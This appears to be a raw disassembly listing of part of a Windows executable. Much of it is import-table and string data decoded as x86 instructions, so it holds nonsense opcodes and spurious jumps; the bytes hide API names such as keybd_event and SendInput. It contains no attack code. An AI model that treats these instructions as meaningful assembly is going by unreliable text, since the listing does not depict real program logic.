  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
